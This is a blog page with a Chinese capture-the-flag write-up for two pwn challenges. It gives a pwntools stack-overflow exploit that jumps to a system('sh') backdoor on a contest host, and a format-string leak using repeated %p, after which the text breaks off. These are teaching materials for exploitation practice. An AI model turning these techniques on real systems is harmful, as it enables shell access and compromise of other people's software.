@@ -1,0 +1,889 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.jpg">
+  <link rel="icon" href="/img/avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#473321">
+  <meta name="author" content="fan fan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="s4_pwnwp by fanfan babystack源代码12345678910111213141516171819202122232425262728293031323334353637#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int ini()&amp;#123;        fflush(stdin);        fflush(stdou">
+<meta property="og:type" content="article">
+<meta property="og:title" content="s4_pwn_wp">
+<meta property="og:url" content="http://example.com/2023/12/05/s4-pwn-wp/index.html">
+<meta property="og:site_name" content="Pfang1n&#39;s blog">
+<meta property="og:description" content="s4_pwnwp by fanfan babystack源代码12345678910111213141516171819202122232425262728293031323334353637#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int ini()&amp;#123;        fflush(stdin);        fflush(stdou">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/12/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/pwn_wp.assets/9305112445264f6cbda685bf9b9bab83.png">
+<meta property="og:image" content="http://example.com/2023/12/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/pwn_wp.assets/6d5c635b835a4be286c518fd5f9d8448.png">
+<meta property="article:published_time" content="2023-12-05T04:42:37.000Z">
+<meta property="article:modified_time" content="2023-12-05T04:45:30.365Z">
+<meta property="article:author" content="fan fan">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/12/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/pwn_wp.assets/9305112445264f6cbda685bf9b9bab83.png">
+  
+  
+  
+  <title>s4_pwn_wp - Pfang1n&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mac.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"💡","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":"trueF","follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pfang1n&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="s4_pwn_wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-12-05 12:42" pubdate>
+          2023年12月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          15k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          125 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">s4_pwn_wp</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="s4-pwn"><a href="#s4-pwn" class="headerlink" title="s4_pwn"></a>s4_pwn</h1><p>wp by fanfan</p>
+<h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ini</span><span class="hljs-params">()</span><br>&#123;<br>        fflush(<span class="hljs-built_in">stdin</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        fflush(<span class="hljs-built_in">stderr</span>);<br>        setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>        setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>        setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">menu</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;It&#x27;s a very easy challenge&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;How to overcome?&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">char</span> v1[<span class="hljs-number">16</span>];<br>        ini();<br>        menu();<br>        system(<span class="hljs-string">&quot;echo \&quot;Who are you? \&quot;&quot;</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%32s&quot;</span>,v1);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK,welcome !&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">sub_2078</span><span class="hljs-params">()</span><br>&#123;<br>        system(<span class="hljs-string">&quot;sh&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>init函数内容只是用来提升程序响应速度的操作，在审伪代码中不需要过多斟酌</p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>栈溢出：</p>
+<p><code>scanf(&quot;%32s&quot;,v1);</code>这行代码限制了用户输入的字符串长度为32个字符。如果用户输入的字符串长度超过这个限制，那么会导致缓冲区溢出。此题中，缓冲区的大小是16个字符，所以触发了栈溢出漏洞。</p>
+<p>使用IDApro查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">.text:00000000004007F5 ; __unwind &#123;<br>.text:00000000004007F5                 push    rbp<br>.text:00000000004007F6                 mov     rbp, rsp<br>.text:00000000004007F9                 sub     rsp, 10h<br>.text:00000000004007FD                 mov     eax, 0<br>.text:0000000000400802                 call    ini<br>.text:0000000000400807                 mov     eax, 0<br>.text:000000000040080C                 call    menu<br>.text:0000000000400811                 mov     edi, offset <span class="hljs-built_in">command</span> ; <span class="hljs-string">&quot;echo \&quot;Who are you? \&quot;&quot;</span><br>.text:0000000000400816                 call    _system<br>.text:000000000040081B                 lea     rax, [rbp+var_10]<br>.text:000000000040081F                 mov     rsi, rax<br>.text:0000000000400822                 mov     edi, offset a32s ; <span class="hljs-string">&quot;%32s&quot;</span> <br>.text:0000000000400827                 mov     eax, 0<br>.text:000000000040082C                 call    ___isoc99_scanf<br>.text:0000000000400831                 mov     edi, offset aOkWelcome ; <span class="hljs-string">&quot;OK,welcome !&quot;</span><br>.text:0000000000400836                 call    _puts<br>.text:000000000040083B                 mov     rax, cs:stdout@@GLIBC_2_2_5<br>.text:0000000000400842                 mov     rdi, rax        ; stream<br>.text:0000000000400845                 call    _fflush<br>.text:000000000040084A                 mov     eax, 0<br>.text:000000000040084F                 leave<br>.text:0000000000400850                 retn<br>.text:0000000000400850 ; &#125; // starts at 4007F5<br></code></pre></td></tr></table></figure>
+
+<p>构造输入，首先填充任意值到返回地址，且在64位下，RBP的大小是8个字节，想要覆盖到返回地址，我们要输入的填充数据大小就是16+8个,同时程序中找到了后门函数,可以直接getshell,我们用这个函数的起始地址覆盖返回地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">text:0000000000400892 ; __unwind &#123;<br>.text:0000000000400892                 push    rbp<br>.text:0000000000400893                 mov     rbp, rsp<br>.text:0000000000400896                 mov     edi, offset aSh ; <span class="hljs-string">&quot;sh&quot;</span><br>.text:000000000040089B                 call    _system<br>.text:00000000004008A0                 nop<br>.text:00000000004008A1                 pop     rbp<br>.text:00000000004008A2                 retn<br>.text:00000000004008A2 ; &#125; // starts at 400892<br>.text:00000000004008A2 _sub_2078       endp<br></code></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p=remote(<span class="hljs-string">&#x27;node01.container.race.nynusec.com&#x27;</span>,<span class="hljs-number">24464</span>)<br>back=<span class="hljs-number">0x400892</span><br>p.sendafter(<span class="hljs-string">&quot;Who are you?&quot;</span>,<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">24</span>+p64(back))<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="easyform"><a href="#easyform" class="headerlink" title="easyform"></a>easyform</h2><h3 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> seed = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span><br>&#123;<br>    fflush(<span class="hljs-built_in">stdin</span>);<br>    fflush(<span class="hljs-built_in">stdout</span>);<br>    fflush(<span class="hljs-built_in">stderr</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,_IONBF,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> alarm(<span class="hljs-number">0x30</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br><br>&#123;       init();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to the NYNUSEC Recruitment Competition\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Are you ready?\n&quot;</span>);<br>        <span class="hljs-type">char</span> wish[<span class="hljs-number">200</span>];<br>        <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;<br>        seed=(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)time(<span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please tell your wish to me and will make it come true&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        read(<span class="hljs-number">0</span>,wish,<span class="hljs-number">200</span>);<br>        <span class="hljs-built_in">printf</span>(wish);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        srand(seed);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>;;k++)<br>        &#123;<br>        <span class="hljs-keyword">if</span> (k==<span class="hljs-number">50</span>)<br>        <span class="hljs-keyword">break</span>;<br>        <span class="hljs-type">int</span> n =rand()%<span class="hljs-number">10</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now is %d-th input&quot;</span>,k);  <br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input number&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a);<br>        <span class="hljs-keyword">if</span>(n != a )<br>        &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;exit&quot;</span>);<br>         <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br><br>        &#125;<br>        hack_me();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">hack_me</span><span class="hljs-params">()</span><br>        &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Wow!Hacker&quot;</span>);<br>        fflush(<span class="hljs-built_in">stdout</span>);<br>        system(<span class="hljs-string">&quot;sh&quot;</span>);<br>        &#125;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><p>这道题额外给了编译时系统的c语言链接库(libc.so.6)</p>
+<p>格式化字符串：</p>
+<p>格式化字符串利用主要分为三个部分</p>
+<blockquote>
+<p>格式化字符串函数 格式化字符串 后续参数，可选</p>
+</blockquote>
+<p><img src="/2023/12/05/s4-pwn-wp/../../%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/pwn_wp.assets/9305112445264f6cbda685bf9b9bab83.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>printf 函数的之前 (即还没有调用 printf)，栈上的布局由高地址到低地址依次如下;<br><img src="/2023/12/05/s4-pwn-wp/../../%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/%25E6%2596%25B0%25E7%2594%259F%25E8%25B5%259B%25E6%25B5%258B%25E8%25AF%2595%25E9%25A2%2598/pwn_wp.assets/6d5c635b835a4be286c518fd5f9d8448.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>常见的有格式化字符串函数有：<br>输入函数：<br><code>scanf()</code><br>输出函数：</p>
+<table>
+<thead>
+<tr>
+<th align="left">函数</th>
+<th align="left">基本介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">printf</td>
+<td align="left">输出到 stdout</td>
+</tr>
+<tr>
+<td align="left">fprintf</td>
+<td align="left">输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td align="left">vprintf</td>
+<td align="left">根据参数列表格式化输出到 stdout</td>
+</tr>
+<tr>
+<td align="left">vfprintf</td>
+<td align="left">根据参数列表格式化输出到指定 FILE 流</td>
+</tr>
+<tr>
+<td align="left">sprintf</td>
+<td align="left">输出到字符串</td>
+</tr>
+<tr>
+<td align="left">snprintf</td>
+<td align="left">输出指定字节数到字符串</td>
+</tr>
+<tr>
+<td align="left">vsprintf</td>
+<td align="left">根据参数列表格式化输出到字符串</td>
+</tr>
+<tr>
+<td align="left">vsnprintf</td>
+<td align="left">根据参数列表格式化输出指定字节到字符串</td>
+</tr>
+<tr>
+<td align="left">setproctitle</td>
+<td align="left">设置 argv</td>
+</tr>
+<tr>
+<td align="left">syslog</td>
+<td align="left">输出日志</td>
+</tr>
+<tr>
+<td align="left">err, verr, warn, vwarn 等</td>
+<td align="left">…….</td>
+</tr>
+</tbody></table>
+<p>这道题中就出现了未加格式化字符串的情况，所以出发漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">.text:08048851                 call    _read<br>.text:08048856                 add     esp, 10h<br>.text:08048859                 sub     esp, 0Ch<br>.text:0804885C                 lea     eax, [ebp+buf]<br>.text:08048862                 push    eax             ; format<br>.text:08048863                 call    _printf<br>.text:08048868                 add     esp, 10h<br>.text:0804886B                 sub     esp, 0Ch<br>.text:0804886E                 push    0Ah             ; c<br></code></pre></td></tr></table></figure>
+
+<p>格式化字符漏洞利用</p>
+<p>泄露</p>
+<p>式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的。所以在调用输出函数时，第一个参数的值就是格式化字符串的地址。</p>
+<p>那么如何确定该格式化字符串为第几个参数？</p>
+<p>重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么就基本说明该地址就是格式化字符串的地址，之所以是基本上确定，这是因为不排除栈上有一些临时变量也是该数值。本题中我们利用字符’a’作为特定字符</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./form                                                                                                                                                                                                 ─╯<br>Welcome to the NYNUSEC Recruitment Competition<br>Are you ready?<br>Please tell your wish to me and will make it come <span class="hljs-literal">true</span><br>aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p                     <br>aaaa-0xffe625b4-0xc8-0x80487e3-0xf7d2f1b4-0xf7f6266c-0xffe62624-0x1-0xf7d3e4be-0x61616161-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70<br></code></pre></td></tr></table></figure>
+
+<p>可以看到这道题的格式化字符串的起始地址正好是输出函数的第9个参数</p>
+<p>修改</p>
+<blockquote>
+<p>pwntools中的pwnlib.fmstr模块提供了字符串漏洞利用的工具。</p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/fmtstr.html">pwnlib.fmtstr — Format string bug exploitation tools</a></p>
+<p>该模块中定义了<code>fmtstr_payload</code>函数</p>
+<p><code>fmtstr_payload</code>用于自动生成格式化字符串payload</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&gt;pwnlib.fmtstr.fmtstr<span class="hljs-constructor">_payload(<span class="hljs-params">offset</span>, <span class="hljs-params">writes</span>, <span class="hljs-params">numbwritten</span>=0, <span class="hljs-params">write_size</span>=&#x27;<span class="hljs-params">byte</span>&#x27;)</span> → str<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>offset</code>：控制的第一个格式化程序的偏移</li>
+<li><code>writes</code>：为字典，用于往addr中写入value，例如**{addr:** <strong>value,</strong> <strong>addr2:</strong> <strong>value2}</strong></li>
+<li><code>numbwritten</code>：已经由<code>printf</code>写入的字节数</li>
+<li><code>write_size</code>：必须是<code>byte/short/int</code>其中之一，指定按什么数据宽度写（<code>%hhn/%hn/%n</code>）</li>
+</ul>
+</blockquote>
+<p>这道题我们就是要修改seed的值</p>
+<p>IDA中seed所在地址在bss端</p>
